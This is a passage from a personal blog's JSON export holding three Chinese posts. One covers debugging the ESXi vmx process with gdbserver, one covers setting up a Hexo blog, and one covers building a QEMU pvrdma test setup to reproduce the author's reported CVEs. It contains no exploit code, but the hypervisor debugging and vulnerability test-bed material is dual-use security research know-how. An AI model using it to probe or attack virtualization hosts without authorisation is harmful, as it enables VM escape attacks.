ESXi)","slug":"debug_vmx_in_esxi","date":"2022-06-17T11:38:05.921Z","updated":"2022-08-11T02:01:09.910Z","comments":true,"path":"2022/06/17/debug_vmx_in_esxi/","link":"","permalink":"http://474172261.github.io/2022/06/17/debug_vmx_in_esxi/","excerpt":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程.","text":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程. 最简单的方法首先, ESXi 自带一个gdbserver, 所以最简单的方法就是直接跑起程序, 再用gdbserver attach它. (最好用老一点的gdb, 比如gdb 7.8) 跑起虚拟机, 查看vmx对应的进程id 1234567[root@192:~] ps|grep vmx70639 70639 vmx70643 70639 vmx-vthread-70670644 70639 vmx-filtPoll:c770645 70639 vmx-mks:c770646 70639 vmx-svga:c770647 70639 vmx-vcpu-0:c7 gdbserver attach 上去 1234567891011[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()!gdb_connected()!gdb_connected()!gdb_connected()[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()Listening on port 8808 一定要保证出现Listening on port, 不然 ctrl+c 中断, 再重试就好, 目标进程不受影响. 找一台可以使用gdb的机器, 把ESXi中的vmx文件拷贝到机器中, 然后使用如下命令连接 12345678910[root@192 vv]# gdb -qgdb$ file Desktop/vmx-7.0-15843807.elf Reading symbols from /home/vv/Desktop/vmx-7.0-15843807.elf...Missing separate debuginfo for /home/vv/Desktop/vmx-7.0-15843807.elf(no debugging symbols found)...done.gdb$ target remote 192.168.170.240:8808Remote debugging using 192.168.170.240:8808=&gt; 0x8ce2771248 &lt;__libc_ifunc_impl_list+3304&gt;: cmp rax,0xfffffffffffff000 0x8ce277124e &lt;__libc_ifunc_impl_list+3310&gt;: ja 0x8ce2771275 &lt;__libc_ifunc_impl_list+3349&gt;gdb$ 这样就可以正常调试了 另一种方法-使用自己编译好的gdb如果自带的gdbserver 不太好用, 那也可以自己源码静态编译一个gdb版本拷贝过去, 然后直接用. 自己源码编译一个gdb, 或者用我编译好的gdb7.8 no python 拷贝到esxi上 如果要自己编译支持带python的gdb, 先下载python源码. 使用./configure --prefix=/home/vv/python; make; make install 编译安装python到&#x2F;home&#x2F;vv&#x2F;python. 然后下载gdb源码, 安装lzma开发组件yum xz-devel texinfo, 使用./configure --prefix=/home/vv/gdb --enable-static --with-python=/home/vv/Desktop/python --with-lzma;make 编译, 成功后make install 安装. 其它操作参考gdb10.2里给出的脚本. 如果想编译11.0之后的gdb, 需要做一下修改, 修改如下: 1234567891011121314151617181920enum target_xfer_statuslinux_nat_target::xfer_partial (enum target_object object, const char *annex, gdb_byte *readbuf, const gdb_byte *writebuf, ULONGEST offset, ULONGEST len, ULONGEST *xfered_len)&#123; ... if (object == TARGET_OBJECT_MEMORY) &#123; ...- return linux_proc_xfer_memory_partial (readbuf, writebuf,- offset, len, xfered_len);+ enum target_xfer_status ret = linux_proc_xfer_memory_partial (readbuf, writebuf,+ offset, len, xfered_len);+ if(ret == TARGET_XFER_OK)&#123;return ret;&#125; &#125; return inf_ptrace_target::xfer_partial (object, annex, readbuf, writebuf, offset, len, xfered_len);&#125; 在11.0之后的版本读取目标进程内存时, 默认从&#x2F;proc&#x2F;pid&#x2F;mem读取, 而esxi上是没有这个文件的, 所以, 除非修改它的实现, 否则之后的版本不适合在esxi上用. 最好还是用7.8的版本, 否则容易有奇奇怪怪的问题 运行起虚拟机 运行gdb, 一般会告诉你缺失libtinfo.so.5文件或者libncurses.so.5, 最简单的方法就是创建一个软链接, 把它自带的一个文件软链接成缺失的文件. 1[root@192:~] ln -s /lib64/libncurses.so.5 /lib64/libtinfo.so.5 或者从centos 7 3.10内核的系统中拷贝一个过去放在lib64目录下. 使用gdb调试 123gdb$ file /bin/vmxgdb$ set architecture i386:x86-64:intelgdb$ attach xxxxx 以下是编译的带python 2.7 的gdb7.8的分块包(因为github最大支持25M), 可以通过cat gdb78_p.tar.xz.* &gt; gdb10.2.tar.xz 合并他们 gdb78_p.tar.xz.s0 gdb78_p.tar.xz.s1 gdb78_p.tar.xz.s2 注意事项如果发现ctrl+c不好使, 那么就把虚拟机的cpu个数设置为1. 如果还是不好使, 建议重新选个guest安装测试.","categories":[],"tags":[],"keywords":[]},{"title":"使用github搭建自己的博客","slug":"build-blog","date":"2022-06-17T11:38:05.905Z","updated":"2020-04-13T06:41:53.202Z","comments":true,"path":"2022/06/17/build-blog/","link":"","permalink":"http://474172261.github.io/2022/06/17/build-blog/","excerpt":"","text":"首先你需要在github创建一个仓储 安装git,npmwindows下载node.js下载git 安装hexo1npm install hexo --save (或者npm install hexo-cli -g) 初始化12hexo init MYBLOGcd MYBLOG “MYBLOG”是目录名称 测试123$ hexo generate$ hexo serverINFO Hexo is running at http://localhost:4000 . Press Ctrl+C to stop. 浏览器访问http://localhost:4000 添加主题访问主题库添加主题, 我比较喜欢Apollo 不过不更新了, 暂时用 next 主题. 配置github推送获取链接修改MYBLOG&#x2F;_config.yml文件 创建sshkey在git-bash里面使用如下指令（通过在Hexo文件夹右键选择 “Git bash here”打开） 1ssh-keygen -t rsa -b 4096 -C &quot;邮件地址@youremail.com&quot; 然后根据提示enter就好(注意文件保存的位置！！) 登录github, 在Account Settings—&gt;SSH Public keys —&gt; add another public keys中添加你的sshkey.pub文件的内容 测试key 1ssh -T git@github.com 新建文章1hexo n &quot;网站标题&quot; 文章文件在Hexo\\source_posts里面，后缀为md这是一个markdown文件，具体语法查看markdown语法 文章内容： title: 文章名date: 2013-05-29 07:56:29 #发表日期updated: 2016-04-06 14:58:03 #更新日期categories: Life #文章分类description: 你对本页的描述tags: [tag1,tag2] #文章标签. 多标签时使用英文逗号隔开photos: #如果使用Fancybox（文章头部展示图片）. 如此设置 URL1URL2#从这里开始 #就是正文 #使用markdown 推送文章1hexo d -g d 是deploy缩写 绑定域名 申请域名 添加选项 在github项目根目录添加CNAME文件, 内容为你的域名(比如 xxx.com) 进入github setting查看往下拉, 出现如下结果就成功了 在文章中添加图片第一种: 是在MYBLOG\\source目录下的images目录里添加图片, 这样在首页也能引用比如文件结构如下: MYBLOG\\source\\images├── b.jpga.jpg 使用![ii1](&#x2F;a.jpg), ![ii2](&#x2F;images&#x2F;b.jpg)引用即可 第二种: 1npm install https://github.com/CodeFalling/hexo-asset-image --save 假设MYBLOG\\source\\_posts里面的结构如下:firstblog├── apppicker.jpg├── logo.jpg└── rules.jpgfirstblog.md目录名必须与md文件名一致, 使用 ![](firstblog&#x2F;logo.jgp)就可以了.","categories":[],"tags":[],"keywords":[]},{"title":"如何给qemu编译配置pvrdma设备","slug":"configure-pvrdma-for-qemu","date":"2022-06-17T11:38:05.905Z","updated":"2021-08-04T01:27:54.584Z","comments":true,"path":"2022/06/17/configure-pvrdma-for-qemu/","link":"","permalink":"http://474172261.github.io/2022/06/17/configure-pvrdma-for-qemu/","excerpt":"缘起于我在审计源码时找到pvrdma的一个bug, 因此需要构建一个pvrdma设备来测试, 但是呢, 因为rdma硬件设备很贵, 所以测试只能用模拟的rdma设备, 这里面, 主要使用的是soft-RoCE类型的模拟设备. 本身这件事不算困难, 奈何网上的资料太少了, 导致我在这方面栽了不少跟头, 分享出来, 希望能够帮助到大家.","text":"缘起于我在审计源码时找到pvrdma的一个bug, 因此需要构建一个pvrdma设备来测试, 但是呢, 因为rdma硬件设备很贵, 所以测试只能用模拟的rdma设备, 这里面, 主要使用的是soft-RoCE类型的模拟设备. 本身这件事不算困难, 奈何网上的资料太少了, 导致我在这方面栽了不少跟头, 分享出来, 希望能够帮助到大家. 准备rdma相关驱动最简单的方法, 使用centos7或者centos8, 执行lsmod |grep rdma, 如果存在rdma_rxe结果, 说明系统已经有了rdma相关驱动. 可以直接跳过这个准备步骤. 另一种方法, 编译一个新内核, 再编译用户态模块. 坑爹之路就此开始. 以下以ubuntu 16.04为例, 按照soft-RoCE的wiki指示开始编译内核. 下载此项目的v18分支. (按我的理解, 直接下载其它kernel源码来编译也是ok的, 没必要非得用这个, 我没有测试, 就不清楚行不行了) 准备相关编译组件 123456sudo apt-get install gitsudo apt-get install libncurses5-devsudo apt-get install libssl-devsudo apt-get install libibcm1 libibcm-dev ibverbs-utils libibverbs-dev sudo apt-get install libibverbs1 librdmacm-dev librdmacm1 rdmacm-utils sudo apt-get install libswitch-perl 进入项目, 开始配置编译选项 12cp /boot/config-`uname -r` .configmake menuconfig 弹出一个配置界面, 输入**&#x2F;, 并键入RXE**, 会得到如下结果: 按1, 跳转到改选项, 按M启用改模块, 之后回到这个配置的主界面保存配置, 再退出 开始编译并安装 1234sudo make -j 4 # 此处的4是cpu的个数, 不要超过它, 不然编译可能更慢sudo make modules_installsudo make installsudo make headers_install INSTALL_HDR_PATH=/usr 重启并使用新编译的内核 下载用户态项目文件, 解压后进入目录 编译并配置 12345678./configure --libdir=/usr/lib64/ --prefix=makemake installsudo ln -s /usr/lib64/librxe.a /usr/lib/librxe.asudo ln -s /usr/lib64/librxe.la /usr/lib/librxe.lasudo ln -s /usr/lib64/librxe-rdmav2.so /usr/lib/librxe-rdmav2.sosudo ln -s /usr/lib64/librxe.so /usr/lib/librxe.so 使用下列命令查看状态, 可能是如下效果 123$ rxe_cfg status Name Link Driver Speed NMTU IPv4_addr RDEV RMTU ens160 yes vmxnet3 10GigE 1500 192.168.170.129 执行下列命令添加网卡并查看状态 12345678910111213141516171819202122232425$ rxe_cfg add ens160$ rxe_cfg start$ ibv_devices device node GUID ------ ---------------- rxe0 020c29fffeee3b66$ ibv_devinfohca_id: rxe0 transport: InfiniBand (0) fw_ver: 0.0.0 node_guid: 020c:29ff:feee:3b66 sys_image_guid: 0000:0000:0000:0000 vendor_id: 0x0000 vendor_part_id: 0 hw_ver: 0x0 phys_port_cnt: 1 port: 1 state: PORT_ACTIVE (4) max_mtu: 4096 (5) active_mtu: 1024 (3) sm_lid: 0 port_lid: 0 port_lmc: 0x00 link_layer: Ethernet 测试网络状态 12$ ibv_rc_pingpong -d rxe0 -g 1local address: LID 0x0000, QPN 0x000011, PSN 0x29338a, GID fe80::12cb:883b:5ccf:e656 另外开启一个bash, 执行ibv_rc_pingpong -d rxe0 -g 1 127.0.0.1 这时候server端会多出一行输出: 1remote address: LID 0x0000, QPN 0x000012, PSN 0xe63ffc, GID fe80::12cb:883b:5ccf:e656 client端会得到如下输出: 12local address: LID 0x0000, QPN 0x000012, PSN 0xe63ffc, GID fe80::12cb:883b:5ccf:e656 remote address: LID 0x0000, QPN 0x000011, PSN 0x29338a, GID fe80::12cb:883b:5ccf:e656 配置qemu编译选项 修改qemu项目中如下文件contrib/rdmacm-mux/meson.build 123456789 executable(&#x27;rdmacm-mux&#x27;, files(&#x27;main.c&#x27;), dependencies: [glib, libumad], build_by_default: true, install: false)改为 executable(&#x27;rdmacm-mux&#x27;, files(&#x27;main.c&#x27;), dependencies: [glib, libumad], build_by_default: true, install: true) 执行如下编译配置 1$ ./configure --enable-rdma --enable-pvrdma --enable-kvm --enable-debug --target-list=x86_64-softmmu 接下来就是make和make install了. 具体参考上一篇关于qemu编译的blog. 编译过程中可能遇到的问题 出现如下提示: 12345&quot; OpenFabrics librdmacm/libibverbs/libibumad not present.&quot; \\&quot; Your options:&quot; \\&quot; (1) Fast: Install infiniband packages (devel) from your distro.&quot; \\&quot; (2) Cleanest: Install libraries from www.openfabrics.org&quot; \\&quot; (3) Also: Install softiwarp if you don&#x27;t have RDMA hardware&quot; 查看项目build&#x2F;config.log文件, 查看出错原因. 我的主要错误是: 1if has error:config-temp/qemu-conf.c:1:27: fatal error: rdma/rdma_cma.h: No such file or directory 通过执行find / -name &quot;rdma_cma.h对整个硬盘搜索rdma_cma.h文件, 发现没找到, 就去网上找了它所在的librdmacm库, 下载解压后, 使用./autogen.sh &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install安装即可. ERROR: Could not detect Ninja v1.7 or newer 这个应该是本机安装的ninja组件, 或者版本过低, 可以通过如下命令下载安装解决 123456$ wget https://github.com/ninja-build/ninja/releases/download/v1.8.2/ninja-linux.zip$ sudo unzip ninja-linux.zip -d /usr/local/bin/$ sudo update-alternatives --install /usr/bin/ninja ninja /usr/local/bin/ninja 1 --force输出:update-alternatives: using /usr/local/bin/ninja to provide /usr/bin/ninja (ninja) in auto mode$ /usr/bin/ninja --version1.8.2 ../hw/block/virtio-blk.c:30:22: fatal error: scsi/sg.h: No such file or directory compilation terminated. 12345678910111213141516$ wget http://launchpadlibrarian.net/353523714/libc6-dev_2.23-0ubuntu10_amd64.deb$ dpkg -i libc6-dev_2.23-0ubuntu10_amd64.deb(Reading database ... 184747 files and directories currently installed.)Preparing to unpack libc6-dev_2.23-0ubuntu10_amd64.deb ...Unpacking libc6-dev:amd64 (2.23-0ubuntu10) over (2.23-0ubuntu3) ...dpkg: dependency problems prevent configuration of libc6-dev:amd64: libc6-dev:amd64 depends on libc6 (= 2.23-0ubuntu10); however: Version of libc6:amd64 on system is 2.23-0ubuntu3. libc6-dev:amd64 depends on libc-dev-bin (= 2.23-0ubuntu10); however: Version of libc-dev-bin on system is 2.23-0ubuntu3.dpkg: error processing package libc6-dev:amd64 (--install): dependency problems - leaving unconfiguredErrors were encountered while processing: libc6-dev:amd64$ apt -f install 启动参数 参照官方指导文档, 需要保证ib_cm模块没有加载, 因此先卸载相关模块. 并且加载必要模块 12$ rmmod rdma_ucm rdma_cm ib_cm$ insmod ib_umad 注意, 默认情况下, rdmacm-mux文件的输出是调用的syslog, 建议改成printf 并把umad_open_port的返回结果输出出来, 以便找到失败原因. 在执行上述操作前, 请确保已经执行过了rxe_cfg start操作. 执行下列命令, 创建所需socket 12345$ qemu-6.0.0/build/contrib/rdmacm-mux/rdmacm-mux -d rxe0unix_socket_path=/var/run/rdmacm-mux-rxe0-1 这行是改成printf后会输出的内容.rdma-device-name=rxe0 这行是改成printf后会输出的内容.rdma-device-port=1 这行是改成printf后会输出的内容.Service started 创建桥接网络 1234567$ apt-get install uml-utilities$ tunctl -t tap0 -u `whoami`$ chmod 0666 /dev/net/tun 让所有用户可读$ ifconfig tap0 192.168.2.1 up 给tap0设置ip段添加防火墙规则$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward$ iptables -t nat -A POSTROUTING -j MASQUERADE 参考网址 最后, qemu启动参数 12345$ /usr/local/bin/qemu-system-x86_64 -object memory-backend-ram,id=mb1,size=1G,share=on -numa node,memdev=mb1 \\-netdev tap,id=mynet0,ifname=tap0,script=no,downscript=no \\-device vmxnet3,netdev=mynet0,id=net0,mac=52:54:00:e3:00:81,addr=0x10.0,multifunction=on \\-chardev socket,path=/var/run/rdmacm-mux-rxe0-1,id=mads -device pvrdma,addr=0x10.1,ibdev=rxe0,netdev=net0,mad-chardev=mads \\-m 1G -hda qemu-6.0.0/centos7.img --enable-kvm 根据官方文档描述, pvrdma必须要三个参数: ibdev, netdev, mad-chardev, 并且To support it, pvrdma device is composed of two PCI functions, an Ethernet device of type vmxnet3 on PCI slot 0 and a PVRDMA device on PCI slot 1., 即在slot 0必须是一个vmxnet3网卡, slot 1是pvrdma, 所以此处vmxnet3的pci地址给的是 0x10.0, 则pvrdma是0x10.1. libvirt配置如果不想直接用命令启动qemu, 用libvirt也可 假如已经存在一个格式为qcow2的虚拟机image文件了, 假设文件名为centos7.img 123456789101112131415161718192021安装相关组件$ apt install libvirt libvirt-python libguestfs-tools virt-install启动相关服务$ systemctl enable libvirtd$ systemctl start libvirtd查看桥接网卡$ brctl showbridge name bridge id STP enabled interfacesvirbr0 8000.525400455887 yes virbr0-nic添加现成虚拟机$ virt-install --import --name vm1 \\--memory 1024 --vcpus 1 --cpu host \\--disk centos7.img,format=qcow2,bus=virtio \\--network bridge=virbr0,model=virtio \\--os-type=linux \\--os-variant=centos7.0 \\--nographics \\--noautoconsole 安装后, 先关闭虚拟机, 然后在/etc/libvirt/qemu/目录下找到vm1.xml文件 12345678910111213141516171819202122&lt;domain type=&#x27;kvm&#x27;&gt; &lt;name&gt;vm2&lt;/name&gt; &lt;devices&gt; &lt;interface type=&#x27;bridge&#x27;&gt; &lt;mac address=&#x27;56:b4:44:e9:62:dc&#x27;/&gt; &lt;source bridge=&#x27;virbr0&#x27;/&gt; &lt;model type=&#x27;vmxnet3&#x27;/&gt; &lt;address type=&#x27;pci&#x27; domain=&#x27;0x0000&#x27; bus=&#x27;0x00&#x27; slot=&#x27;0x10&#x27; function=&#x27;0x0&#x27; multifunction=&#x27;on&#x27;/&gt; &lt;/interface&gt; &lt;/devices&gt; &lt;qemu:commandline&gt; &lt;qemu:arg value=&#x27;-object&#x27;/&gt; &lt;qemu:arg value=&#x27;memory-backend-ram,id=mb1,size=1G,share&#x27;/&gt; &lt;qemu:arg value=&#x27;-numa&#x27;/&gt; &lt;qemu:arg value=&#x27;node,memdev=mb1&#x27;/&gt; &lt;qemu:arg value=&#x27;-chardev&#x27;/&gt; &lt;qemu:arg value=&#x27;socket,path=/var/run/rdmacm-mux-rxe0-1,id=mads&#x27;/&gt; &lt;qemu:arg value=&#x27;-device&#x27;/&gt; &lt;qemu:arg value=&#x27;pvrdma,addr=10.1,ibdev=rxe0,netdev=bridge0,mad-chardev=mads&#x27;/&gt; 注意这里是10.1 必须和vmxnet3的bus=&#x27;0x00&#x27; slot=&#x27;0x10&#x27; function=&#x27;0x0&#x27; 对应, 保证bus相同, slot相同, 其中function: 0为vmxnet3, 1为pvrdma. &lt;/qemu:commandline&gt;&lt;/domain&gt; 此处的bridge0是哪一个我不是很确定, 需要的人得自己琢磨一下了. 我配置这里主要是为了获取vmxnet3的真实启动配置参数. 常见的virsh命令: 列出所有虚拟机virsh list --all 获取虚拟机信息virsh dominfo vm1 关闭虚拟机virsh shutdown vm1 启动虚拟机virsh start vm1 虚拟机随宿主机启动而自动启动virsh autostart vm1 安全重启虚拟机virsh reboot vm1 重启虚拟机(不安全，hard reset)virsh reset vm1 删除虚拟机virsh shutdown vm1virsh undefine vm1virsh pool-destroy vm1 结语一开始并不知道centos可以省去那么多麻烦, 在ubuntu上卡了很久很久, 问了Li Qiang大佬和官方的人, 也没有得到具体的配置方法, 最后总算是靠着一行行看配置文件找到失败原因, 并一一解决, 这里更不提那个softiWarp了, 这里虽然没用到, 但是那个错误提示里提到后, 我就以为需要配置它, 也踩了不少的坑 T-T. 在rdmacm-mux的编译和启动那一步也卡了很久, 不明白为什么启动不了server, 后来明白是自己给的设备名字不对, 并不是一个任意名字, 必须是设备名. 启动参数那也费了很多力气, 官方文档是用libvirt, 由于缺乏相关使用经验, 就先自己琢磨的参数, 后来实在有问题, 就用libvirt创建了虚拟机, 并修改了相关文件的配置, 添加成功命令, 并一步步找失败原因. 他们文档说是要让vmxnet3在slot 0, 但是并没有说怎么放到slot 0, 中间还遇到PCI: single function device can&#39;t be populated in function 10.1错误, 后来发现是vmxnet3缺少multifunction参数所致. qemu官方文档真的太坑了, 信息给的少, 网上也缺乏相关资料, 只能自己琢磨, 唉, 坑啊~ 最后呢, 是我发现的3个相关bug: cve-2021-3582, cve-2021-3607, cve-2021-3608, 虽然其中两个都有可能导致虚拟化逃逸, 但是现在没有任何厂商在用这个设备, 所以也就没什么实质性的危害.","categories":[],"tags":[],"keywords":[]}]}